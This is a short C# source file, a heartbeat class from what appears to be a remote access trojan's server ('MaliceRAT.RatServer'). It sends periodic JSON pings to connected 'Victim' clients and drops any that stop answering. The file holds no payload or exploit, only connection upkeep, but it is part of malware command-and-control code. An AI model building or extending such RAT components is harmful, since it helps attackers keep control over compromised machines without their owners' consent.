using System;
using System.Net.Sockets;
using System.Timers;
using System.Threading.Tasks;

namespace MaliceRAT.RatServer.Features
{
    public class Heartbeat
    {
        #region Variables
        private double interval;
        private Timer heartbeatTimer;
        private Server server;
        private bool heartbeatReceived = true;

        public Heartbeat(double interval, Server server)
        {
            this.interval = interval;
            this.server = server;
            heartbeatTimer = new Timer(interval);
        }
        #endregion

        #region Methods
        public void StartHeartbeat(NetworkStream stream, Victim client)
        {
            heartbeatTimer.Elapsed += async (sender, e) =>
            {
                if (!heartbeatReceived)
                {
                    heartbeatTimer.Stop();
                    stream.Close();
                    server.OnClientDisconnected(client);
                    return;
                }
                heartbeatReceived = false;
                await SendHeartbeat(stream, client);
            };
            heartbeatTimer.Start();
        }

        public void StopHeartbeat()
        {
            heartbeatTimer.Stop();
        }

        public void ReceiveHeartbeat()
        {
            heartbeatReceived = true;
        }

        private async Task SendHeartbeat(NetworkStream stream, Victim client)
        {
            string heartbeatMessage = "{\"type\":\"heartbeat\"}";
            byte[] data = System.Text.Encoding.UTF8.GetBytes(heartbeatMessage);
            await stream.WriteAsync(data, 0, data.Length);
        }
        #endregion
    }
}